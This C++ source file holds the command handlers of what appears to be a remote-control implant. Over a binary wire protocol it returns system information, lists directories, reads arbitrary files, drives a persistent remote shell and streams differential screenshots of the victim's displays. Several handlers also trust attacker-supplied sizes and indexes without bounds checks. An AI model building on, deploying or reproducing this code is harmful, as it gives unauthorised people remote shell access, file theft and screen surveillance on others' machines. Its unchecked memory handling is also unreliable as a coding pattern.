#include "commands.h"
#include "memory.h"
#include "file.h"
#include "directory_iterator.h"
#include "path.h"
#include "string.h"
#include "math.h"
#include "logger.h"
#include "sha2.h"
#include "vector.h"
#include "system_info.h"

// =============================================================================
// Wire helpers
// =============================================================================

#pragma pack(push, 1)
struct WireDirectoryEntry
{
    CHAR16 Name[256];
    UINT64 CreationTime;
    UINT64 LastModifiedTime;
    UINT64 Size;
    UINT32 Type;
    BOOL IsDirectory;
    BOOL IsDrive;
    BOOL IsHidden;
    BOOL IsSystem;
    BOOL IsReadOnly;
};
#pragma pack(pop)

static VOID ToWireEntry(const DirectoryEntry &src, WireDirectoryEntry &dst)
{
    StringUtils::WideToChar16(
        Span<const WCHAR>(src.Name, StringUtils::Length(src.Name)),
        Span<CHAR16>(dst.Name, 256));
    dst.CreationTime = src.CreationTime;
    dst.LastModifiedTime = src.LastModifiedTime;
    dst.Size = src.Size;
    dst.Type = src.Type;
    dst.IsDirectory = src.IsDirectory;
    dst.IsDrive = src.IsDrive;
    dst.IsHidden = src.IsHidden;
    dst.IsSystem = src.IsSystem;
    dst.IsReadOnly = src.IsReadOnly;
}

static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
{
    if (commandLength < sizeof(CHAR16))
    {
        widePath[0] = L'\0';
        return 0;
    }

    PCCHAR16 wirePath = (PCCHAR16)(command);
    USIZE maxChar16 = commandLength / sizeof(CHAR16);
    USIZE wireLen = 0;
    while (wireLen < maxChar16 && wirePath[wireLen] != 0)
        wireLen++;

    USIZE len = StringUtils::Char16ToWide(
        Span<const CHAR16>(wirePath, wireLen),
        Span<WCHAR>(widePath, widePathSize));

    for (USIZE i = 0; i < len; ++i)
    {
        if (widePath[i] == L'\\' || widePath[i] == L'/')
            widePath[i] = (WCHAR)PATH_SEPARATOR;
    }
    return len;
}

static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
{
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = code;
}

static BOOL IsDotEntry(const DirectoryEntry &entry)
{
    return StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".") ||
           StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L"..");
}

// =============================================================================
// Command handlers
// =============================================================================

VOID Handle_GetSystemInfoCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    SystemInfo info;
    GetSystemInfo(&info);

    *responseLength = sizeof(UINT32) + sizeof(SystemInfo);
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &info, sizeof(SystemInfo));

    LOG_INFO("GetSystemInfo: hostname=%s, arch=%s, platform=%s", info.Hostname, info.Architecture, info.Platform);
}

VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    WCHAR directoryPath[1024];
    DecodeWirePath(command, commandLength, directoryPath, 1024);
    LOG_INFO("GetDirectoryContent: %ws", directoryPath);

    auto result = DirectoryIterator::Create(directoryPath);
    if (!result.IsOk())
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    DirectoryIterator &iter = result.Value();
    Vector<DirectoryEntry> entries;
    if (!entries.Init())
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    while (iter.Next())
    {
        const DirectoryEntry &entry = iter.Get();
        if (IsDotEntry(entry))
            continue;
        if (!entries.Add(entry))
        {
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
    }

    UINT64 entryCount = (UINT64)entries.Count;
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
    *response = new CHAR[*responseLength];

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &entryCount, sizeof(UINT64));

    WireDirectoryEntry *wireEntries = (WireDirectoryEntry *)(*response + sizeof(UINT32) + sizeof(UINT64));
    for (UINT64 i = 0; i < entryCount; i++)
    {
        Memory::Zero(&wireEntries[i], sizeof(WireDirectoryEntry));
        ToWireEntry(entries.Data[i], wireEntries[i]);
    }
}

VOID Handle_GetFileContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    UINT64 readCount = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + pathOffset, commandLength > pathOffset ? commandLength - pathOffset : 0, filePath, 1024);
    LOG_INFO("GetFileContent: %ws offset=%llu count=%llu", filePath, offset, readCount);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    File &file = openResult.Value();
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)readCount;
    *response = new CHAR[*responseLength];

    (void)file.SetOffset((USIZE)offset);
    auto readResult = file.Read(Span<UINT8>((UINT8 *)(*response + sizeof(UINT32) + sizeof(UINT64)), (USIZE)readCount));
    UINT32 bytesRead = readResult ? readResult.Value() : 0;

    *(PUINT32)*response = StatusCode::StatusSuccess;
    *(PUINT64)(*response + sizeof(UINT32)) = bytesRead;
}

VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    UINT64 chunkSize = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + hashPathOffset, commandLength > hashPathOffset ? commandLength - hashPathOffset : 0, filePath, 1024);
    LOG_INFO("GetFileChunkHash: %ws chunkSize=%llu offset=%llu", filePath, chunkSize, offset);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    File &file = openResult.Value();
    UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
    PUINT8 buffer = new UINT8[bufferSize];

    SHA256 sha256;
    USIZE totalRead = 0;

    while (totalRead < chunkSize)
    {
        UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
        (void)file.SetOffset((USIZE)(offset + totalRead));
        auto readResult = file.Read(Span<UINT8>(buffer, (USIZE)bytesToRead));
        UINT32 bytesRead = readResult ? readResult.Value() : 0;
        if (bytesRead == 0)
            break;
        sha256.Update(Span<const UINT8>(buffer, bytesRead));
        totalRead += bytesRead;
    }
    delete[] buffer;

    *responseLength += SHA256_DIGEST_SIZE;
    *response = new CHAR[*responseLength];

    UINT8 digest[SHA256_DIGEST_SIZE];
    sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), digest, SHA256_DIGEST_SIZE);
    LOG_INFO("GetFileChunkHash: hashed %llu bytes", (UINT64)totalRead);
}

VOID Handle_WriteShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    if (context->shell == nullptr)
    {
        auto shellResult = Shell::Create();
        if (!shellResult)
        {
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
    }

    while (commandLength > 0 && command[commandLength - 1] == '\0')
        commandLength--;

    auto writeResult = context->shell->Write(command, commandLength);
    if (!writeResult)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
}

VOID Handle_ReadShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    if (context->shell == nullptr)
    {
        auto shellResult = Shell::Create();
        if (!shellResult)
        {
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
    }

    CHAR buffer[4096];
    auto readResult = context->shell->Read(buffer, sizeof(buffer));
    if (!readResult)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    USIZE bytesRead = readResult.Value() + 1;
    *responseLength += bytesRead;
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    StringUtils::Copy(Span<CHAR>(*response + sizeof(UINT32), bytesRead), Span<const CHAR>(buffer, bytesRead));
}

VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    if (context->vncContext == nullptr)
        context->vncContext = new VNCContext();

    auto displays = Screen::GetDevices();
    if (!displays)
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ScreenDeviceList &deviceList = displays.Value();
    context->vncContext->DeviceList = deviceList;

    *responseLength += sizeof(deviceList.Count) + (USIZE)(deviceList.Count * sizeof(ScreenDevice));
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &deviceList.Count, sizeof(deviceList.Count));
    Memory::Copy(*response + sizeof(UINT32) + sizeof(deviceList.Count), deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice)));

    LOG_INFO("GetDisplays: %u display(s)", deviceList.Count);
}

VOID JspegCallback(PVOID context, PVOID data, INT32 size)
{
    JpegBuffer *jpegBuffer = (JpegBuffer *)context;

    if (data == nullptr)
    {
        if (jpegBuffer->outputBuffer == nullptr)
        {
            jpegBuffer->size = (UINT32)size;
            jpegBuffer->outputBuffer = new UINT8[jpegBuffer->size];
        }
    }

    if (jpegBuffer->offset + size > jpegBuffer->size)
    {
        UINT32 newSize = Math::Max(jpegBuffer->size * 2, jpegBuffer->size + size);
        PUINT8 newBuffer = new UINT8[newSize];
        Memory::Copy(newBuffer, jpegBuffer->outputBuffer, jpegBuffer->offset);
        delete[] jpegBuffer->outputBuffer;
        jpegBuffer->outputBuffer = newBuffer;
        jpegBuffer->size = newSize;
    }

    Memory::Copy(jpegBuffer->outputBuffer + jpegBuffer->offset, data, (USIZE)size);
    jpegBuffer->offset += (UINT32)size;
}

VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    auto displayIndex = *(PUINT32)(command);
    auto quality = *(PUINT32)(command + sizeof(UINT32));
    auto isFullScreen = *(PUINT32)(command + sizeof(UINT32) + sizeof(UINT32));

    if (context->vncContext == nullptr)
        context->vncContext = new VNCContext();

    if (context->vncContext->DeviceList.Count == 0)
    {
        auto displays = Screen::GetDevices();
        if (!displays)
        {
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->vncContext->DeviceList = displays.Value();
    }

    const ScreenDevice &device = context->vncContext->DeviceList.Devices[displayIndex];

    if (context->vncContext->GraphicsList.count == 0)
    {
        context->vncContext->GraphicsList.graphicsArray = new Graphics[context->vncContext->DeviceList.Count];
        context->vncContext->GraphicsList.count = context->vncContext->DeviceList.Count;
    }

    Graphics &graphics = context->vncContext->GraphicsList.graphicsArray[displayIndex];
    if (graphics.currentScreenshot == nullptr)
    {
        graphics.currentScreenshot = new RGB[device.Width * device.Height];
        isFullScreen = true;
    }
    if (graphics.screenshot == nullptr)
    {
        graphics.screenshot = new RGB[device.Width * device.Height];
        isFullScreen = true;
    }
    if (graphics.bidiff == nullptr)
    {
        graphics.bidiff = new UINT8[device.Width * device.Height];
        isFullScreen = true;
    }

    if (!Screen::Capture(device, Span<RGB>(graphics.currentScreenshot, device.Width * device.Height)))
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    if (isFullScreen)
    {
        JpegBuffer jpegBuffer;
        auto encodeResult = JpegEncoder::Encode(JspegCallback, &jpegBuffer, (INT32)quality, (INT32)device.Width, (INT32)device.Height, 3, Span<const UINT8>((UINT8 *)graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB)));
        if (encodeResult.IsErr())
        {
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

        Rectangle rect(0, 0, jpegBuffer.offset, jpegBuffer.outputBuffer);
        UINT32 countOfSegments = 1;

        *responseLength += sizeof(countOfSegments) + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData) + jpegBuffer.offset;
        *response = new CHAR[*responseLength];
        *(PUINT32)*response = StatusCode::StatusSuccess;
        Memory::Copy(*response + sizeof(UINT32), &countOfSegments, sizeof(UINT32));
        rect.toBuffer((UINT8 *)*response + sizeof(UINT32) + sizeof(UINT32));
        return;
    }

    ImageProcessor::CalculateBiDifference(Span<const RGB>(graphics.currentScreenshot, device.Width * device.Height),
                                          Span<const RGB>(graphics.screenshot, device.Width * device.Height),
                                          device.Width, device.Height,
                                          Span<UCHAR>(graphics.bidiff, device.Width * device.Height));

    ImageProcessor::RemoveNoise(Span<UCHAR>(graphics.bidiff, device.Width * device.Height),
                                device.Width, device.Height);

    auto contourResult = ImageProcessor::FindContours(Span<INT8>((INT8 *)graphics.bidiff, device.Width * device.Height),
                                                      (INT32)device.Height, (INT32)device.Width);
    if (contourResult.IsErr())
    {
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    auto &contours = contourResult.Value();

    UINT32 countOfContour = 0;
    PRGB rectScan0 = nullptr;
    USIZE packetSize = *responseLength + sizeof(UINT32);
    PCHAR packet = new CHAR[packetSize];
    USIZE offset = sizeof(UINT32) + sizeof(UINT32);

    PContourNode hierarchy = contours.Hierarchy;
    PContour contoursArray = contours.Contours;
    JpegBuffer jpegBuffer;

    for (INT32 i = 0; i < contours.ContourCount; i++)
    {
        if (hierarchy[i].Parent != 1)
            continue;

        INT32 minX = contoursArray[i].Points[0].Col;
        INT32 minY = contoursArray[i].Points[0].Row;
        INT32 maxX = 0, maxY = 0;

        for (INT32 j = 0; j < contoursArray[i].Count; j++)
        {
            if (contoursArray[i].Points[j].Col < minX) minX = contoursArray[i].Points[j].Col;
            if (contoursArray[i].Points[j].Col > maxX) maxX = contoursArray[i].Points[j].Col;
            if (contoursArray[i].Points[j].Row < minY) minY = contoursArray[i].Points[j].Row;
            if (contoursArray[i].Points[j].Row > maxY) maxY = contoursArray[i].Points[j].Row;
        }

        INT32 rectWidth = maxX - minX + 1;
        INT32 rectHeight = maxY - minY + 1;

        if (rectWidth % 4 != 0)
            rectWidth -= rectWidth % 4;
        if (rectHeight < 32 || rectWidth < 32)
            continue;

        countOfContour++;
        rectScan0 = new RGB[rectHeight * rectWidth];

        for (INT32 j = 0; j < rectHeight; j++)
            for (INT32 k = 0; k < rectWidth; k++)
                rectScan0[j * rectWidth + k] = graphics.currentScreenshot[(minY + j) * device.Width + minX + k];

        jpegBuffer.offset = 0;
        auto encodeResult = JpegEncoder::Encode(JspegCallback, &jpegBuffer, (INT32)quality, rectWidth, rectHeight, 3, Span<const UINT8>((UINT8 *)rectScan0, rectWidth * rectHeight * sizeof(RGB)));
        if (encodeResult.IsErr())
        {
            delete[] rectScan0;
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        Rectangle rect((UINT32)minX, (UINT32)minY, jpegBuffer.size, jpegBuffer.outputBuffer);
        packetSize += jpegBuffer.size + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData);

        auto newPacket = new CHAR[packetSize];
        Memory::Copy(newPacket, packet, offset);
        delete[] packet;
        packet = newPacket;

        offset += rect.toBuffer((UINT8 *)packet + offset);
        delete[] rectScan0;
        rectScan0 = nullptr;
    }

    Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

    *(PUINT32)(packet + sizeof(UINT32)) = countOfContour;
    *response = packet;
    *responseLength = packetSize;
    *(PUINT32)*response = StatusCode::StatusSuccess;

    contours.Free();
}
